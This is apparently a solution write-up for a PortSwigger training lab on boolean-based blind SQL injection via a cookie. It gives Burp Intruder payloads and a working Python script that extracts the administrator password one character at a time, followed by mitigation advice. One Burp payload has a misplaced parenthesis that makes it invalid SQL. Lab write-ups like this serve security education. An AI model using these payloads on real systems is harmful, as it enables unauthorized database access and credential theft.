# 🧪 Lab 11: Blind SQL Injection with Conditional Responses Solution

**PortSwigger Lab Link:** [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses]

**Table of Contents:**
* 1. Lab Description
* 2. Vulnerability
* 3. Exploitation Steps
* 4. Python Automation Code
* 5. Key Learnings/Concepts
* 6. Mitigation

---

## 1. Lab Description

This lab introduces **Blind SQL Injection** where the server does **not** return direct data or errors. The vulnerability is found in the **`TrackingId` cookie**. The **oracle** (true/false indicator) is a **"Welcome back" message** displayed on the page if the injected condition is true, and no message if the condition is false. The goal is to **dump the administrator's password**.

---

## 2. Vulnerability

The vulnerability is **Boolean-based Blind SQL Injection**. The application uses input from the `TrackingId` cookie in an SQL query, allowing an attacker to append a logical condition (`AND`) that controls a noticeable application response (the "Welcome back" message).

* **Test 1 (True Condition):** `TrackingId=0987abc' AND 1=1--` $\implies$ Get "Welcome back" because `1=1` is true.
* **Test 2 (False Condition):** `TrackingId=0987abc' AND 1=2--` $\implies$ Do not get "Welcome back" because `1=2` is not true.

---

## 3. Exploitation Steps

### 🔹 Step 1: Find Password Length (Brute-force/Sniper)

The first step is to find the length of the password using the `LENGTH()` function.

1.  **Burp Intruder Setup (Sniper):** Send the request to Intruder. Set the attack type to **Sniper**.
2.  **Payload Position:** Select the number `N` in the payload (using `§N§`):
    ```sql
    ' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = N--
    ```
3.  **Payload Settings:** Set Payload type to **Numbers**, From `1`, To `100`.
4.  **Grep Match:** In **Options $\rightarrow$ Grep - Match**, clear pre-existing lists and add the string `"Welcome back!"`.
5.  **Result:** The request where `"Welcome back"` is displayed indicates the correct length.
    * 📌 **The Password Length is found to be 20**.

### 🔹 Step 2: Extract Password Characters (Burp Cluster Bomb)

Now we need to extract the characters one by one (1st, then 2nd, up to 20th) using the `SUBSTRING()` method.

1.  **Burp Intruder Setup (Cluster Bomb):** Change attack type to **Cluster Bomb**.
2.  **Payload Structure (2 Positions):** The general idea is to check if `SUBSTRING(...)` at position `I` equals character `C`.
    ```sql
    ' AND (SELECT SUBSTRING(password FROM users WHERE username='administrator'), §I§, 1) = '§C§'--
    ```
3.  **Payload Set 1 (Position - `I`):**
    * Payload Type: **Numbers**.
    * From: `1`, To: `20`, Step: `1`.
4.  **Payload Set 2 (Character - `C`):**
    * Payload Type: **Brute Forcer**.
    * Character Set: `abcd...WXYZ012...89` (or the known alphanumeric set).
    * Min/Max Length: `1`.
5.  **Start Attack:** After completing the attack, sort the results by the **Grep Match** column (presence of "Welcome back!"). The successful `(I, C)` pairs reveal the password.

### 🔹 Step 3: Log In and Solve the Lab

1.  Use the extracted 20-character password with the username `administrator`.
2.  Log in to solve the lab.

---

## 4. Python Automation Code

Automation is the easiest way to solve this large brute-force task.

```python
import requests

# Base parameters (Change these for the specific lab instance)
url = '[https://0a54....web-security](https://0a54....web-security)..../filter?category=Lifestyle'  # Example URL
# Define a comprehensive character set
characters = '1234567890abcdefghijklmnopqrstuvwxyz' 

# Base cookie values (Must be copied from Burp for a fresh session)
base_cookie = {'TrackingId':'0987abc', 'session':'0123xyz'} # Example values


def get_length():
    print("Finding password length...")
    for i in range(1, 101): # Check length up to 100
        # Payload for guessing length
        payload = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = {i}--"
        
        # Construct the cookie with the payload
        cookie = base_cookie.copy()
        cookie['TrackingId'] = cookie['TrackingId'] + payload # Append payload to TrackingId
        
        r = requests.get(url, cookies=cookie)
        
        if 'Welcome back!' in r.text: # The oracle condition
            return i
    return None

def get_data(length):
    dumped_password = ""
    print(f"Dumping Data... Please wait.") #
    
    for i in range(1, length + 1): # Iterate through each character position (1 to length)
        temp = ""
        for char in characters:
            # Payload for guessing character C at position I (Note: SQL index starts at 1)
            payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1) = '{char}'--"
            
            # Construct the cookie
            cookie = base_cookie.copy()
            cookie['TrackingId'] = cookie['TrackingId'] + payload
            
            r = requests.get(url, cookies=cookie)
            
            if 'Welcome back!' in r.text:
                dumped_password += char
                temp += char
                print(f"\rPassword: {dumped_password}", end="") # Print progressively
                break # Move to the next character position

    print(f"\nGot it! Data: {dumped_password}") # Final result
    return dumped_password

# --- Execution ---
length = get_length()
if length:
    print(f"Password Length: {length}") #
    admin_password = get_data(length)
else:
    print("Could not determine length.")
```
## 6. Key Learnings/Concepts

Blind SQL Injection: This is necessary when the application hides database data and errors.

Boolean Oracle: The success of the attack hinges on a single, binary difference in the application's response (e.g., the presence or absence of a specific message).

Sequential Information Retrieval: Blind SQLi is a methodical, automated process of asking a thousand simple true/false questions to extract complex information, one piece at a time.

Core SQL Functions:

LENGTH(string): Returns the length of a string.

SUBSTRING(string, start, length): Extracts a substring starting at the specified position (start index is typically 1, not 0).

Automation is Key: Due to the large number of requests required, tools like Burp Intruder (Cluster Bomb attack type) or custom scripts (like Python requests) are essential for efficiency.

## 7. Mitigation
Preventing Blind SQL Injection requires layered defense:

Parameterized Queries (Prepared Statements): The primary defense. This ensures the entire TrackingId value is treated as inert data and cannot be executed as part of the SQL logic.

Input Validation: Strictly validate and sanitize all input (even in cookies and headers). Reject any data in the TrackingId cookie that contains SQL special characters (', --, AND, etc.).

Generic Responses: The application should be designed so that its output is identical, regardless of the success or failure of a benign, non-data-returning query. If the backend query returns a different status for true/false, the application must normalize the visible output to prevent it from becoming an oracle.

Least Privilege: Configure the database connection used by the web application to have the minimum necessary permissions. The application should not be able to query the users table or sensitive data if its job is only to display product information.
